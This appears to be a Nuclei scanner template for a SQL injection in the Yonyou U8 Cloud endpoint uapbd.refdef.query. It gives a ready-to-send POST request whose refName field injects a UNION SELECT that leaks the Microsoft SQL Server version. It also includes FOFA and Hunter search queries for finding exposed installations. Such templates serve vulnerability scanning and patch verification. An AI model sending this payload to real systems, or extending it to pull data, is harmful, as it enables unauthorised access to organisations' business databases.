id: yonyou-u8-cloud-appcode-sqli
info:
  name: 用友 U8 Cloud uapbd.refdef.query - sqli
  author: leadlife
  severity: high
  description:
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3uapbd.refdef.query%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="用友-U8-Cloud" || title=="U8C"
    hunter-query: app.name="用友 U8 Cloud"
  tags: yonyou,sqli,oa,u8cloud

http:
  - raw:
      - |
        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        Accept-Encoding: gzip
        Connection: close

        {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server','nvarchar')
        condition: and